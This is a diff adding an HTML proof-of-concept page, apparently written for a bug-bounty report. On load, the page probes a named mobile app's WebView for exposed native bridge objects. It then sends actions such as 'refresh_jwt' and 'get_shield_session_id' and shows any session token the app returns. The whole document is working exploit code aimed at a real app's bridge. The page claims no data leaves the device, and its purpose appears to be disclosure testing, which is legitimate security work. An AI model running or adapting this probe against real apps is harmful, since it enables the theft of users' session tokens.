@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>WebView Bridge Test</title>
+<style>
+  :root { --bg:#0d1117; --card:#161b22; --border:#30363d; --accent:#58a6ff; --ok:#3fb950; --warn:#d29922; --bad:#f85149; --text:#e6edf3; --dim:#8b949e; }
+  * { box-sizing:border-box; margin:0; padding:0; }
+  body { background:var(--bg); color:var(--text); font-family:-apple-system,'SF Mono',Menlo,Consolas,monospace; padding:14px; font-size:13px; }
+  h1 { font-size:16px; color:var(--accent); margin-bottom:2px; font-weight:600; }
+  .sub { color:var(--dim); font-size:11px; margin-bottom:12px; }
+  #status { background:var(--card); border:1px solid var(--border); border-radius:8px; padding:10px; margin-bottom:10px; font-size:14px; }
+  #log { background:#000; border:1px solid var(--border); border-radius:8px; padding:10px; white-space:pre-wrap; word-break:break-all; min-height:200px; font-size:12px; line-height:1.5; }
+  .ok { color:var(--ok); } .warn { color:var(--warn); } .bad { color:var(--bad); } .hi { color:var(--accent); }
+  #jwt { width:100%; margin-top:10px; background:#000; color:var(--ok); border:1px solid var(--ok); border-radius:6px; padding:8px; font-size:11px; min-height:34px; }
+  button { background:var(--card); color:var(--text); border:1px solid var(--border); border-radius:6px; padding:8px 12px; margin:8px 6px 0 0; font-size:13px; }
+</style>
+</head>
+<body>
+<h1>WebView Bridge Probe</h1>
+<div class="sub">BBP security test page — demonstrates whether native app bridges are exposed to this page. No data leaves this device.</div>
+<div id="status">probing…</div>
+<div id="log"></div>
+<input id="jwt" readonly placeholder="captured token appears here">
+<div>
+  <button onclick="fireAll()">Re-run probes</button>
+</div>
+<script>
+var LOG = document.getElementById('log');
+function log(s, cls) {
+  var line = document.createElement('div');
+  if (cls) line.className = cls;
+  line.textContent = new Date().toTimeString().slice(0,8) + '  ' + s;
+  LOG.appendChild(line);
+}
+// Native→JS delivery callback (Android no4.java uses exactly this name)
+function callWebView(o) {
+  var s = (typeof o === 'string') ? o : JSON.stringify(o);
+  log('<<< callWebView: ' + s.slice(0, 500), 'ok');
+  document.getElementById('jwt').value = s;
+  document.getElementById('status').innerHTML = '<span class="ok">✓ NATIVE → PAGE DELIVERY RECEIVED</span>';
+}
+// iOS apps often emit lifecycle actions
+function on_application_did_become_active(d) { log('<<< lifecycle: ' + JSON.stringify(d), 'warn'); }
+
+function describeObj(name, o) {
+  try {
+    var props = [];
+    for (var k in o) { try { props.push(k + ':' + typeof o[k]); } catch(e){} }
+    log('  ' + name + ' keys: ' + props.join(', '), 'hi');
+  } catch(e) { log('  ' + name + ' describe failed', 'warn'); }
+}
+
+function tryPost(bridge, name, payload) {
+  try {
+    if (typeof bridge.postMessage === 'function') { bridge.postMessage(payload); log('>>> ' + name + '.postMessage sent: ' + payload.slice(0,80)); return true; }
+    if (typeof bridge === 'function') { bridge(payload); log('>>> ' + name + '() sent'); return true; }
+  } catch(e) { log('  ' + name + ' post error: ' + e.message, 'warn'); }
+  return false;
+}
+
+var found = [];
+function probe() {
+  log('UA: ' + navigator.userAgent.slice(0,120), '');
+  log('origin: ' + location.href, '');
+
+  // 1. Android-style addJavascriptInterface
+  var candidates = ['Indrive', 'Indriver', 'IndriveApp', 'Android', 'nativeApp', 'webApp'];
+  candidates.forEach(function(n) {
+    if (window[n] && window[n] !== callWebView) {
+      log('BRIDGE OBJECT window.' + n + ' FOUND', 'ok');
+      describeObj(n, window[n]);
+      found.push(window[n]);
+    }
+  });
+
+  // 2. iOS WKScriptMessageHandler
+  if (window.webkit && window.webkit.messageHandlers) {
+    try {
+      var names = [];
+      for (var k in window.webkit.messageHandlers) names.push(k);
+      if (names.length) { log('iOS messageHandlers FOUND: ' + names.join(', '), 'ok'); names.forEach(function(n){ found.push(window.webkit.messageHandlers[n]); }); }
+      else log('webkit.messageHandlers present but empty', 'warn');
+    } catch(e) { log('messageHandlers enum error: ' + e.message, 'warn'); }
+  } else {
+    log('no window.webkit.messageHandlers (not an iOS WKWebView bridge)', '');
+  }
+
+  if (!found.length) {
+    document.getElementById('status').innerHTML = '<span class="bad">✗ no bridge exposed to this page</span>';
+    log('No native bridge reachable from this origin. Either page loaded outside app webview, or bridge is origin-restricted.', 'warn');
+  } else {
+    document.getElementById('status').innerHTML = '<span class="ok">✓ bridge present — sending probe actions</span>';
+    fireAll();
+  }
+}
+
+function fireAll() {
+  var payloads = [
+    '{"action":"refresh_jwt"}',
+    '{"action":"get_shield_session_id"}',
+    '{"action":"get_topup_payload"}'
+  ];
+  var targets = found.slice();
+  // also always try the known Android name + iOS handler even if not enumerated
+  if (window.Indrive) targets.push(window.Indrive);
+  if (window.webkit && window.webkit.messageHandlers) {
+    ['Indrive','Indriver','bridge','native'].forEach(function(n){
+      try { if (window.webkit.messageHandlers[n]) targets.push(window.webkit.messageHandlers[n]); } catch(e){}
+    });
+  }
+  payloads.forEach(function(p) {
+    targets.forEach(function(t) { tryPost(t, 'bridge', p); });
+  });
+  log('probe actions dispatched (' + targets.length + ' target(s))', 'hi');
+}
+probe();
+</script>
+</body>
+</html>
